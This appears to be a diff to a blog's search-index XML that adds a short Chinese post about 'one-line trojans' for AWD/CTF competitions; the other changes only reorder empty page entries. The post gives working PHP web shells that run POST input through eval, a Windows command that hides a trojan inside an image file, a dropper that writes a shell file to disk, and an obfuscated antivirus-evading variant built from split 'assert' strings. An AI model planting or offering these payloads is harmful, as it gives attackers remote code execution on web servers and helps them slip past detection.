@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>《关于一句话木马》</title>
+      <link href="/2023/02/20/2023%E5%B9%B42%E6%9C%8820%E6%97%A519%EF%BC%9A20/"/>
+      <url>/2023/02/20/2023%E5%B9%B42%E6%9C%8820%E6%97%A519%EF%BC%9A20/</url>
+      
+        <content type="html"><![CDATA[<p>2023年2月20日19：20</p><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="图片木马"><a href="#图片木马" class="headerlink" title="图片木马"></a>图片木马</h2><p>可以在windows系统的终端下输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 图片名称/b+木马文件名称/a 生成图片木马名称</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##&lt;?php fputs(fopen(&#x27;muma.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[hack]);?&gt;&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="木马免杀"><a href="#木马免杀" class="headerlink" title="木马免杀"></a>木马免杀</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##&lt;?php $a1 = &quot;ass&quot;;$a2 = &quot;ert&quot;;$arr=array($a1.$a2=&gt;&quot;test&quot;);$arr1=array_flip($arr);$arr2 = &quot;$arr1[test]&quot;;@$arr2($_POST[&#x27;fbi&#x27;]);?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="闲谈"><a href="#闲谈" class="headerlink" title="闲谈"></a>闲谈</h2><p>AWD确实比ctf有意思不少，不论进攻抑或是防守，都有很大的乐趣，进攻者一步步渗透进入对方的服务器中获取flag，防守方看到敌方发送的木马并且及时删除，都是满满的成就感。</p>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>《BUUCTF WEB 随便注》</title>
       <link href="/2023/02/03/2023%E5%B9%B42%E6%9C%883%E6%97%A520%EF%BC%9A07/"/>
       <url>/2023/02/03/2023%E5%B9%B42%E6%9C%883%E6%97%A520%EF%BC%9A07/</url>
@@ -174,6 +187,17 @@
     
     
     <entry>
+      <title>图片</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>音乐</title>
       <link href="/music/index.html"/>
       <url>/music/index.html</url>
@@ -188,17 +212,6 @@
       <title>友链</title>
       <link href="/link/index.html"/>
       <url>/link/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>图片</title>
-      <link href="/movies/index.html"/>
-      <url>/movies/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
